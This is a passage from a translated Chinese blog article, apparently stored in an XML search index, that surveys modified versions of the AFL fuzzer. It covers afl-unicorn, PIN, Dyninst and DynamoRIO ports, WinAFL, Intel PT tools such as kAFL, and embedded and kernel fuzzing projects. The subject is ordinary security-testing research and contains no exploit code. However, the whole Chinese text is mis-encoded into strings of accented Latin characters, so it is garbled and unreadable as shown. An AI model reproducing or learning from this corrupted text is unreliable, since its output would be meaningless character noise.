æ³•æž„å»ºç”¨äºŽè§£æžå™¨åˆ†æžçš„ç‹¬ç«‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰å¹¶ä¸”ç¨‹åºä¸ç›´æŽ¥èŽ·å–è¾“å…¥æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œæ•°æ®è¢«åŠ å¯†æˆ–æ˜¯å¦‚åœ¨ CGC äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ä¿¡å·æ ·æœ¬ï¼‰ï¼Œç„¶åŽæˆ‘ä»¬å¯ä»¥é€†å‘å¹¶æ‰¾åˆ°æ‰€è°“çš„ä½ç½®å‡½æ•°ï¼Œå‡½æ•°ä¸­ä¸­æ•°æ®ä»¥ä¾¿äºŽæ¨¡ç³Šæµ‹è¯•å™¨ä½¿ç”¨çš„æ ¼å¼è¿›è¡Œå¤„ç†ã€‚è¿™æ˜¯ AFL æœ€æ™®é/é€šç”¨çš„ä¿®æ”¹ï¼Œå³å®ƒå…è®¸æ¨¡ç³Šæµ‹è¯•ä»»ä½•ä¸œè¥¿ã€‚å®ƒç‹¬ç«‹äºŽæž¶æž„ã€æºã€è¾“å…¥æ•°æ®æ ¼å¼å’ŒäºŒè¿›åˆ¶æ ¼å¼ï¼ˆä¾‹å¦‚è£¸æœºï¼Œåªæ˜¯æ¥è‡ªæŽ§åˆ¶å™¨å†…å­˜çš„ä»£ç ç‰‡æ®µï¼‰ã€‚ç ”ç©¶äººå‘˜é¦–å…ˆæ£€æŸ¥è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¹¶ç¼–å†™ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•å™¨ï¼Œå®ƒåœ¨è§£æžè¿‡ç¨‹çš„è¾“å…¥ç«¯æ¨¡æ‹ŸçŠ¶æ€ã€‚æ˜¾ç„¶ä¸Ž AFL ä¸åŒï¼Œè¿™éœ€è¦å¯¹äºŒè¿›åˆ¶è¿›è¡Œä¸€å®šçš„æ£€æŸ¥ã€‚å¯¹äºŽè£¸æœºå›ºä»¶ï¼Œå¦‚ Wi-FI æˆ–åŸºå¸¦ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½ä¸€äº›ç¼ºç‚¹ï¼š æˆ‘ä»¬å¿…é¡»æœ¬åœ°å¤„ç†æŽ§åˆ¶å’Œçš„æ£€æŸ¥ æ¨¡ç³Šæµ‹è¯•å™¨çš„çŠ¶æ€æ˜¯ä¿å­˜åœ¨å†…å­˜è½¬å‚¨ä¸­çš„å†…å­˜çŠ¶æ€ï¼Œè¿™å¯ä»¥é˜²æ­¢æ¨¡ç³Šæµ‹è¯•å™¨è¿›å…¥æŸäº›è·¯å¾„ åŠ¨æ€å†…å­˜è°ƒç”¨æ²¡æœ‰æ¶ˆæ¯’ï¼Œä½†å®ƒå¯ä»¥æ‰‹åŠ¨å®žçŽ°ï¼Œå®ƒå°†å–å†³äºŽ RTOSï¼ˆå¿…é¡»è¿›è¡Œç ”ç©¶ï¼‰ æœªæ¨¡æ‹Ÿä»»åŠ¡å†… RTOS äº¤äº’ï¼Œè¿™ä¹Ÿå¯èƒ½é˜»æ­¢å¯»æ‰¾æŸäº›è·¯å¾„ ä½¿ç”¨è¿™ç§ä¿®æ”¹çš„ä¾‹å­æœ‰ï¼š afl-unicorn: Fuzzing Arbitrary Binary Code afl-unicorn: Part 2 â€” Fuzzing the â€˜Unfuzzableâ€™ unicorefuzz ä½¿ç”¨ afl-unicorn æ¥ fuzz å†…æ ¸ åœ¨æˆ‘ä»¬ç»§ç»­åŸºäºŽåŠ¨æ€äºŒè¿›åˆ¶æ£€æµ‹ï¼ˆDBIï¼‰æ¡†æž¶è¿›è¡Œä¿®æ”¹ä¹‹å‰ï¼Œä¸è¦å¿˜è®°è¿™äº›æ¡†æž¶çš„æœ€å¿«é€Ÿåº¦ç”± DynamoRIOï¼ŒDynlnst ä»¥åŠ PIN å®žçŽ°ã€‚ åŸºäºŽ PIN çš„æ”¹è¿› aflpin â€” é‡‡ç”¨ Intel PIN æ’æ¡©çš„ AFL afl_pin_mode â€” å¦ä¸€ä¸ªé‡‡ç”¨ Intel PIN æ’æ¡©çš„ AFL afl-pin â€” é‡‡ç”¨ PINtool çš„ AFL NaFl â€” AFL æ¨¡ç³Šæµ‹è¯•å™¨çš„å…‹éš†ï¼ˆåŸºæœ¬æ ¸å¿ƒï¼‰ PinAFL â€” è¯¥å·¥å…·çš„ä½œè€…è¯•å›¾å°† AFL ç§»æ¤åˆ° Windowsï¼Œä»¥ä¾¿å¯¹å·²ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚è¯¥é¡¹ç›®å¥½åƒæ˜¯ä¸ºäº†å¥½çŽ©è€Œåœ¨ä¸€å¤œä¹‹é—´å®Œæˆçš„ä¸”æœªè¿›ä¸€æ­¥å‘å±•ã€‚å­˜å‚¨åº“é‡Œæ²¡æœ‰æºæ–‡ä»¶ï¼Œåªæœ‰å·²ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œå¯åŠ¨æŒ‡ä»¤ã€‚æˆ‘ä»¬ä¸çŸ¥é“å®ƒåŸºäºŽå“ªä¸ªç‰ˆæœ¬çš„ AFLï¼Œå®ƒåªæ”¯æŒ 32 ä½åº”ç”¨ç¨‹åºã€‚ æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼ŒAFL æœ‰è®¸å¤šä¸åŒçš„ä¿®æ”¹ï¼Œä½†å®ƒä»¬åœ¨çŽ°å®žç”Ÿæ´»ä¸­å¹¶ä¸æ˜¯éžå¸¸æœ‰ç”¨ã€‚ åŸºäºŽ Dyninst çš„æ”¹è¿›afl-dyninst â€” AFL + Dyninst == AFL é»‘ç›’æ¨¡ç³Šæµ‹è¯•ã€‚è¿™ä¸ªç‰ˆæœ¬çš„ç‰¹ç‚¹æ˜¯é¦–å…ˆä½¿ç”¨ Dyninst å¯¹ä¸€ä¸ªç ”ç©¶è¿‡çš„ç¨‹åºï¼ˆæ²¡æœ‰æºä»£ç ï¼‰è¿›è¡Œé™æ€æ’æ¡©ï¼ˆé™æ€äºŒè¿›åˆ¶æ’æ¡©ï¼Œé™æ€äºŒè¿›åˆ¶é‡å†™ï¼‰ï¼Œç„¶åŽä½¿ç”¨ç»å…¸ AFL è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼ŒAFL ä¼šè®¤ä¸ºç¨‹åºæ˜¯ç”¨ afl-gcc/afl-g++/afl-as æž„å»ºçš„ã€‚å› æ­¤ï¼Œå®ƒåœ¨æ²¡æœ‰æºä»£ç çš„æƒ…å†µä¸‹ä»¥éžå¸¸å¥½çš„ç”Ÿäº§çŽ‡å·¥ä½œï¼šä¸Žæœ¬åœ°ç¼–è¯‘ç›¸æ¯”ï¼Œç»å…¸ AFL æ˜¯ 0.25 å€çš„é€Ÿåº¦ã€‚ä¸ŽQEMUç›¸æ¯”ï¼Œå®ƒå…·æœ‰æ˜¾ç€ä¼˜åŠ¿ï¼šå®ƒå…è®¸åŠ¨æ€é“¾æŽ¥åº“çš„æ’æ¡©ï¼Œè€Œ QEMU åªèƒ½æ’æ¡©ä¸Žåº“é™æ€é“¾æŽ¥çš„åŸºæœ¬å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç„¶è€ŒçŽ°åœ¨å®ƒåªæ”¯æŒ Linuxï¼Œå¦‚æžœå¢žåŠ å¯¹äºŽ Windows æ”¯æŒï¼Œåˆ™éœ€è¦å¯¹ Dyninst æœ¬èº«è¿›è¡Œæ›´æ”¹ï¼Œè¿™ä¸ªå·¥ä½œæ­£åœ¨è¿›è¡Œä¸­ã€‚ è¿˜æœ‰å¦ä¸€ä¸ªåˆ†æ”¯å…·æœ‰æå‡çš„é€Ÿåº¦å’ŒæŸäº›åŠŸèƒ½ï¼ˆAARCH64 å’Œ PPC æž¶æž„çš„æ”¯æŒï¼‰ã€‚ åŸºäºŽ DynamoRIO çš„æ”¹è¿› drAFL â€” AFl + DynamoRIO â€“ åœ¨ Linux ä¸Šæ²¡æœ‰æºä»£ç çš„æ¨¡ç³Šæµ‹è¯• afl-dr â€” åŸºäºŽ DynamoRIO çš„å¦ä¸€ç§å®žçŽ°ï¼Œåœ¨ Habr ä¸Šæœ‰å¾ˆå¥½çš„æè¿° afl-dynamorio â€” æ¥è‡ª vanhauser-thc çš„ä¿®æ”¹ã€‚ æ®ä»–æ‰€è¯´ï¼šâ€œå½“æ­£å¸¸çš„ afl-dyninst èƒ½å¤Ÿä½¿äºŒè¿›åˆ¶å´©æºƒå¹¶ä¸” QEMU æ¨¡å¼ -Q æ— æ³•æ‰§è¡Œæ—¶ï¼Œç”¨ DynamoRIO è¿è¡Œ AFLã€‚â€å®ƒæ”¯æŒ ARM å’Œ AARCH64ã€‚DynamoRIO æ¯” QEMU æ…¢å¤§çº¦ 10 å€ï¼Œæ¯” dyninst æ…¢ 25 å€ï¼Œä½†æ¯” Pintool å¿« 10 å€ã€‚ WinAFL â€” æœ€è‘—åçš„ AFLåˆ†æ”¯ã€‚ï¼ˆDynamoRIOï¼Œä¹Ÿæ˜¯ syzygy æ¨¡å¼ï¼‰ã€‚è¿™ä¸ªä¿®æ”¹çš„å‡ºçŽ°åªæ˜¯æ—¶é—´é—®é¢˜ï¼Œå› ä¸ºè®¸å¤šäººæƒ³åœ¨ Windows ä¸Šå°è¯• AFL å¹¶å°†å…¶åº”ç”¨äºŽæ²¡æœ‰æºä»£ç çš„åº”ç”¨ç¨‹åºã€‚ç›®å‰ï¼Œè¿™ä¸ªå·¥å…·æ­£åœ¨è¢«ç§¯æžæ”¹è¿›ï¼Œå°½ç®¡ AFL ä»£ç åº“ï¼ˆæ’°å†™æœ¬æ–‡æ—¶ä¸º 2.43bï¼‰ç›¸å¯¹è¿‡æ—¶ï¼Œä½†å®ƒéƒ½æœ‰åŠ©äºŽå‘çŽ°å¤šä¸ªæ¼æ´žï¼ˆCVE-2016-7212ï¼ŒCVE-2017-0073ï¼ŒCVE- 2017-0190ï¼ŒCVE-2017-11816ï¼‰ã€‚Google Zero Project å›¢é˜Ÿå’Œ MSRC æ¼æ´žä¸Žè§£å†³å›¢é˜Ÿçš„ä¸“å®¶æ­£åœ¨å‚ä¸Žæ­¤é¡¹ç›®ï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›å®ƒèƒ½å¤Ÿå¾—åˆ°è¿›ä¸€æ­¥çš„å‘å±•ã€‚å¼€å‘äººå‘˜ä½¿ç”¨åŠ¨æ€æ’æ¡©ï¼ˆåŸºäºŽDynamoRIOï¼‰è€Œä¸æ˜¯ç¼–è¯‘æ—¶æ’æ¡©ï¼Œè¿™æ˜¾ç€å‡æ…¢äº†è¢«åˆ†æžè½¯ä»¶çš„æ‰§è¡Œé€Ÿåº¦ï¼Œä½†äº§ç”Ÿçš„å¼€é”€ï¼ˆåŠ å€ï¼‰ä¸ŽäºŒè¿›åˆ¶æ¨¡å¼ä¸‹çš„ç»å…¸ AFL ç›¸å½“ã€‚ä»–ä»¬è¿˜è§£å†³äº†å¿«é€Ÿå¯åŠ¨è¿‡ç¨‹çš„é—®é¢˜ï¼Œç§°å…¶ä¸ºæŒç»­æ¨¡ç³Šæµ‹è¯•æ¨¡å¼ï¼›ä»–ä»¬é€‰æ‹©å¯¹å‡½æ•°è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼ˆé€šè¿‡æ–‡ä»¶å†…éƒ¨çš„åç§»æˆ–å¯¼å‡ºè¡¨ä¸­å­˜åœ¨çš„å‡½æ•°åç§°ï¼‰å¹¶å¯¹å…¶è¿›è¡Œæ’æ¡©ï¼Œä»¥ä¾¿å¯ä»¥åœ¨å¾ªçŽ¯ä¸­è°ƒç”¨å®ƒï¼Œä»Žè€Œå¯åŠ¨å¤šä¸ªè¾“å…¥æ•°æ®æ ·æœ¬è€Œæ— éœ€é‡æ–°å¯åŠ¨ç¨‹åºã€‚æœ€è¿‘å‘è¡¨çš„ä¸€ç¯‡æ–‡ç« æè¿°äº†ä½œè€…å¦‚ä½•ä½¿ç”¨ WinAFL åœ¨çº¦ 50 å¤©å†…å‘çŽ°çº¦ 50 ä¸ªæ¼æ´žã€‚å‘å¸ƒä¹‹åŽå¾ˆå¿« WinAFL å°±æ”¯æŒ Intel PTï¼ˆProcessor Tracingï¼Œå¤„ç†å™¨è·Ÿè¸ªï¼‰æ¨¡å¼ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ‰¾åˆ°ç»†èŠ‚ä¿¡æ¯ã€‚ ä¸“ä¸šè¯»è€…å¯èƒ½æ³¨æ„åˆ°è¿™äº›æ”¹è¿›ä½¿ç”¨äº†é™¤äº†Fridaä¹‹å¤–çš„å„ç§æµè¡Œçš„æ’æ¡©æ¡†æž¶ã€‚ å”¯ä¸€æåˆ° Frida ä¸Ž AFL çš„ç»“åˆä½¿ç”¨æ˜¯åœ¨ Chizpurfle: A Gray-Box Android Fuzzer for Vendor Service Customizations ä¸­æ‰¾åˆ°çš„ã€‚ å¸¦ Frida çš„ AFL ç‰ˆæœ¬éžå¸¸æœ‰ç”¨ï¼Œå› ä¸º Frida æ”¯æŒå¤šç§ RISC æž¶æž„ã€‚ è®¸å¤šç ”ç©¶è€…ä¹ŸæœŸå¾…ç”± Capstoneï¼ŒUnicorn å’Œ Keystone çš„åˆ›å»ºè€…å‘å¸ƒçš„ DBI Scopio æ¡†æž¶ã€‚åŸºäºŽè¿™ä¸ªæ¡†æž¶ï¼Œä½œè€…å·²ç»åˆ›å»ºäº†ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•å™¨ï¼ˆDarkoï¼‰ï¼Œæ®ä»–ä»¬è¯´èƒ½å¤ŸæˆåŠŸåœ°ä½¿ç”¨å®ƒæ¥å¯¹åµŒå…¥å¼è®¾å¤‡è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚æœ‰å…³è¿™æ–¹é¢çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜… Digging Deep: Finding 0days in Embedded Systems with Code Coverage Guided Fuzzingã€‚ åŸºäºŽå¤„ç†å™¨ç¡¬ä»¶ç‰¹å¾çš„æ”¹è¿›å…³äºŽæ”¯æŒå¤„ç†å™¨ç¡¬ä»¶åŠŸèƒ½çš„ AFL ä¿®æ”¹æ–¹é¢ï¼Œé¦–å…ˆï¼Œå®ƒå…è®¸å¯¹å†…æ ¸ä»£ç è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼›å…¶æ¬¡ï¼Œå®ƒå…è®¸åœ¨æ²¡æœ‰æºä»£ç çš„æƒ…å†µä¸‹æ›´å¿«åœ°å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ å½“ç„¶ï¼Œè°ˆåˆ°å¤„ç†å™¨ç¡¬ä»¶åŠŸèƒ½ï¼Œæˆ‘ä»¬æœ€æ„Ÿå…´è¶£çš„æ˜¯ Intel PTã€‚ä»Žç¬¬ 6 ä»£å¤„ç†å™¨å¼€å§‹ï¼ˆå¤§çº¦è‡ª2015å¹´èµ·ï¼‰æ”¯æŒè¯¥åŠŸèƒ½ã€‚ å› æ­¤ï¼Œä¸ºäº†èƒ½å¤Ÿä½¿ç”¨ä¸‹é¢åˆ—å‡ºçš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ”¯æŒ Intel PT çš„å¤„ç†å™¨ã€‚ WinAFL-IntelPT â€” ä½¿ç”¨ Intel PT è€Œä¸æ˜¯ DynamoRIO çš„ç¬¬ä¸‰æ–¹ WinAFLã€‚ ptfuzzer - ä½¿ç”¨ Intel PT å¯¹äºŒè¿›åˆ¶è¿›è¡Œé»‘ç›’æµ‹è¯•ã€‚ kAFL â€” ä¸€ä¸ªæ—¨åœ¨è§£å†³ç‹¬ç«‹äºŽæ“ä½œç³»ç»Ÿçš„æ¨¡ç³Šæµ‹è¯•å†…æ ¸æ—¶çš„è¦†ç›–çŽ‡å¯¼å‘é—®é¢˜çš„å­¦æœ¯é¡¹ç›®ã€‚ å®ƒé€šè¿‡ä½¿ç”¨ç®¡ç†ç¨‹åºï¼ˆhypervisorï¼‰å’Œ Intel PT æ¥è§£å†³è¯¥é—®é¢˜ã€‚æœ‰å…³å®ƒçš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨ç™½çš®ä¹¦ kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels ä¸­æ‰¾åˆ°ã€‚ AFL å…·ä½“åº”ç”¨ GUSTAVE - ä¸€ä¸ªåµŒå…¥å¼æ“ä½œç³»ç»Ÿå†…æ ¸çš„ Fuzzerï¼ŒåŸºäºŽ QEMU å’Œ AFLã€‚ ä½¿ç”¨ AFL å¯¹åµŒå…¥å¼ç³»ç»Ÿçš„ TEE è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚PDF-operating-systems%20using-AFL.pdf) YOUTUBE Janus - åŸºäºŽ AFL å’Œ Syzkaller å¯¹ linux çš„æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œ æ”¯æŒ 8 ç§æ–‡ä»¶ç³»ç»Ÿ ext4ã€XFSã€btrfsã€F2FSã€GFS2ã€HFS+ã€ReiserFS å’Œ vFATï¼›ä»¥åŠ 34 ä¸ªæ–‡ä»¶æ“ä½œçš„ç³»ç»Ÿè°ƒç”¨ã€‚ åˆ©ç”¨ AFL æ¨¡ç³Šæµ‹è¯• statzoneã€‚åœ°å€ åˆ©ç”¨ AFL æ¨¡ç³Šæµ‹è¯• Linux å†…æ ¸ã€‚åœ°å€ FIRM-AFL - åŸºäºŽ AFL å®žçŽ°çš„ç”¨äºŽ IoT å›ºä»¶ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„å·¥å…·ã€‚PDF å¯¹ OP-TEE çš„ç³»ç»Ÿè°ƒç”¨æŽ¥å£è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚åœ°å€ åˆ©ç”¨ WinAFL å¯¹äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œåˆ©ç”¨å†…å­˜è®¿é—®çƒ­å›¾æ¥ç²¾ç®€è¾“å…¥ç§å­å¤§å°ã€‚åœ°å€ FuzzFactory - AFL æ‰©å±•, ä½¿ç”¨ Waypoints é’ˆå¯¹ç‰¹å®šé¢†åŸŸè¿›è¡Œé€šç”¨çš„ä»¥è¦†ç›–çŽ‡ä½å¯¼å‘çš„æ¨¡ç³Šæµ‹è¯•ã€‚YOUTUBE Paper PowerFL - PowerFL = AFL + QEMU + VxWorksï¼Œä½¿ç”¨ AFL å’Œ QEMU å¯¹ PowerPC å’Œ Intel i386 VxWorks è¿›è¡Œ fuzzã€‚ frida-js-afl-instr - ä½¿ç”¨ AFL++ å’Œ Frida è¿›è¡Œ Linux å†…å­˜ä¸­çš„æ¨¡ç³Šæµ‹è¯•ã€‚ æ€»ç»“å¦‚ä½ æ‰€è§ï¼Œç ”ç©¶äººå‘˜ä»åœ¨ç§¯æžåœ°æ”¹è¿› AFLï¼Œè€Œä¸” AFL è¿˜å­˜åœ¨è¿›è¡Œå®žéªŒå’Œåˆ›æ–°çš„ç©ºé—´ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„å®žç”¨æœ‰è¶£çš„ AFLã€‚ æ„Ÿè°¢é˜…è¯»ï¼Œç¥å¤§å®¶ Fuzz é¡ºåˆ©ã€‚ åŽŸæ–‡é“¾æŽ¥]]></content>
      <categories>
        <category>æ¼æ´žæŒ–æŽ˜</category>
      </categories>
      <tags>
        <tag>å¤–æ–‡ç¿»è¯‘</tag>
        <tag>æ¼æ´žæŒ–æŽ˜</tag>
        <tag>AFL</tag>
      </tags>
  </entry>
</search>
